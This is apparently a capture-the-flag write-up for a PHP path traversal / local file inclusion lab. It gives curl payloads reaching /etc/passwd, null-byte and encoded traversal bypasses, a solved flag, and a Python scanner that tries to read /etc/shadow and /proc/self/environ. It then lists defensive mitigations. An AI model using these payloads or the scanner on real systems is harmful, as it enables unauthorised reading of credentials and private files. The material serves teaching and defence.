# Directory / Path Traversal — Professional Exploit Guide

> **LinkedIn:** [Aidar Nizamov](https://www.linkedin.com/in/aidar-nizamov-58a3ba27b)

---

## Learning Objectives

- Path traversal attack vectors and mechanics
- Directory traversal depth enumeration
- Accessing sensitive system files (`/etc/passwd`)
- Null byte injection bypass (PHP < 5.3)
- Encoded traversal sequence attempts (`%2e%2e%2f`)

---

## Required Tools

| Tool | Purpose |
|------|---------|
| `curl` | Send crafted HTTP requests |
| `wget` | Retrieve files over HTTP |
| `grep` | Filter interesting output |
| `Python 3` | Automation and depth scanning |
| `Burp Suite` | Request interception, fuzzing |

---

## Prerequisites

- Understanding of the Linux file system hierarchy
- Knowledge of HTTP request structure
- Familiarity with web server file inclusion mechanisms

---

## Vulnerability Overview

| Property | Value |
|----------|-------|
| **Parameter** | `page` (file path fragment) |
| **Endpoint** | `/?page=<input>` |
| **Vulnerability** | Path traversal / Local File Inclusion (LFI) |
| **CVSS Score** | 7.5 (High) |
| **Impact** | Arbitrary file read, source code disclosure, sensitive data exposure |

The application includes a file based on the `page` parameter without sanitizing `../` sequences:

```php
// Vulnerable code — no path validation
include($_GET['page'] . '.php');
```

This lets an attacker escape the web root and read any file the web server process can access.

---

## Step-by-Step Exploitation

### Step 1 — Identify the File Inclusion Endpoint

Submit a normal request to confirm the parameter controls file loading:

```
GET /?page=home HTTP/1.1
Host: localhost:8080
```

The page renders normally, confirming `page` is a file selector.

---

### Step 2 — Test Basic `../` Traversal

Move one directory up:

```bash
curl -s "http://localhost:8080/?page=../" | grep alert
# → <script>alert('Nope..');</script>
```

The application detects a single level of traversal and shows a hint.

---

### Step 3 — Enumerate Traversal Depth

Increase the depth until the server responds differently:

```bash
# Same directory (no traversal)
curl -s "http://localhost:8080/?page=./" | grep alert
# → (no alert — normal page)

# 4 levels deep
curl -s "http://localhost:8080/?page=../../../../" | grep alert
# → <script>alert('Almost.');</script>

# Full traversal to filesystem root (14 levels)
curl -s "http://localhost:8080/?page=../../../../../../../../../../" | grep alert
# → <script>alert('You can DO it !!!  :]');</script>
```

The different alert messages confirm the server evaluates the traversal depth.

---

### Step 4 — Access `/etc/passwd`

Once depth is confirmed, append the target file path:

```bash
curl "http://localhost:8080/?page=../../../../../../../../../../etc/passwd" | grep flag
```

Response contains:

```html
<script>alert('Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0 ');</script>
```

---

### Step 5 — Attempt to Read Application Source Files

```bash
curl -s "http://localhost:8080/?page=../../../../../../../../../../var/www/html/index" \
  | grep -i 'include\|require\|flag'
```

---

### Step 6 — Null Byte Injection (PHP < 5.3)

When the application appends `.php`, a null byte terminates the string before the extension:

```
/?page=../../../../../../../../../../etc/passwd%00
```

On vulnerable PHP versions, the server includes `/etc/passwd` instead of `/etc/passwd.php`.

---

### Step 7 — Encoded Traversal Sequences

Bypass simple string filters with URL-encoded variants:

```
# Double-URL encoding
/?page=..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd

# Unicode encoding
/?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd

# Mixed encoding
/?page=....//....//....//etc/passwd
```

**Flag:** `b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0`

---

## Python Automation Script

```python
#!/usr/bin/env python3
"""
Automated path traversal depth scanner and system file enumerator.
"""
import requests
import re
import sys

TARGET_FILES = [
    "etc/passwd",
    "etc/shadow",
    "etc/hosts",
    "proc/self/environ",
    "var/www/html/index.php",
]

def scan_depth(base_url: str, max_depth: int = 20) -> int:
    """Find the minimum traversal depth needed to escape the web root."""
    for depth in range(1, max_depth + 1):
        traversal = "../" * depth
        url = f"{base_url.rstrip('/')}/?page={traversal}"
        try:
            resp = requests.get(url, timeout=5)
            if "You can DO it" in resp.text:
                print(f"[+] Successful traversal depth: {depth}")
                return depth
            elif "Almost" in resp.text:
                print(f"[~] Getting closer at depth {depth}...")
        except requests.RequestException as e:
            print(f"[-] Request error at depth {depth}: {e}")
    return -1

def read_file(base_url: str, depth: int, filepath: str) -> str | None:
    """Attempt to read a file at a given traversal depth."""
    traversal = "../" * depth
    url = f"{base_url.rstrip('/')}/?page={traversal}{filepath}"
    try:
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            return resp.text
    except requests.RequestException:
        pass
    return None

def extract_flag(html: str) -> str | None:
    """Extract a 64-character hex flag."""
    m = re.search(r'\b[0-9a-fA-F]{64}\b', html)
    return m.group(0).lower() if m else None

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"
    print(f"[*] Scanning traversal depth at {target}...")
    depth = scan_depth(target)

    if depth < 0:
        print("[-] Could not determine traversal depth.")
        sys.exit(1)

    print(f"\n[*] Attempting to read system files at depth {depth}...")
    for filepath in TARGET_FILES:
        content = read_file(target, depth, filepath)
        if content:
            flag = extract_flag(content)
            if flag:
                print(f"[+] FLAG FOUND in {filepath}: {flag}")
            else:
                print(f"[+] Read {filepath} ({len(content)} bytes)")
        else:
            print(f"[-] Could not read {filepath}")
```

**Usage:**

```bash
python3 traversal_scanner.py http://localhost:8080
```

---

## Defensive Mitigations

### 1. Whitelist Allowed Page Values

```php
<?php
// Only allow known, safe page identifiers
$allowed_pages = [
    'home'   => 'pages/home.php',
    'about'  => 'pages/about.php',
    'media'  => 'pages/media.php',
    'signin' => 'pages/signin.php',
];

$key = $_GET['page'] ?? 'home';
if (!array_key_exists($key, $allowed_pages)) {
    http_response_code(404);
    include 'pages/404.php';
    exit;
}
include $allowed_pages[$key];
```

### 2. Path Normalization with `realpath()`

```php
<?php
$base = realpath(__DIR__ . '/pages/') . DIRECTORY_SEPARATOR;
$requested = realpath($base . $_GET['page'] . '.php');

// Ensure the resolved path starts with the allowed base directory
if ($requested === false || strpos($requested, $base) !== 0) {
    http_response_code(403);
    exit('Access denied.');
}
include $requested;
```

### 3. Reject Traversal Characters in Input

```php
<?php
$page = $_GET['page'] ?? '';
if (preg_match('/(\.\.|\/|\\\\)/', $page)) {
    http_response_code(400);
    exit('Invalid page parameter.');
}
```

### 4. Filesystem Isolation — `chroot` / Docker

```dockerfile
# Run the web server in an isolated container with a minimal filesystem
FROM php:8.2-apache
WORKDIR /var/www/html
COPY ./public /var/www/html
# No /etc/passwd, /etc/shadow, or other sensitive files visible from the container
```

### 5. Security Headers

```php
<?php
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("Content-Security-Policy: default-src 'self';");
```

---

## Key Takeaways

1. **Never construct file paths from user input** without strict validation.
2. **`realpath()` + prefix check** is a reliable way to confine file access to a directory.
3. **Allowlists always outperform blocklists** — denying `../` is easily bypassed with encoding.
4. **Container / chroot isolation** provides defense-in-depth even when application code is vulnerable.
5. **Null byte injection** (`%00`) is a classic bypass for PHP applications appending extensions.

---

## References & Resources

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [PortSwigger — Directory Traversal](https://portswigger.net/web-security/file-path-traversal)
- [PayloadsAllTheThings — Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
- [PHP `realpath()` documentation](https://www.php.net/manual/en/function.realpath.php)

---

> **Author:** [Aidar Nizamov](https://www.linkedin.com/in/aidar-nizamov-58a3ba27b)
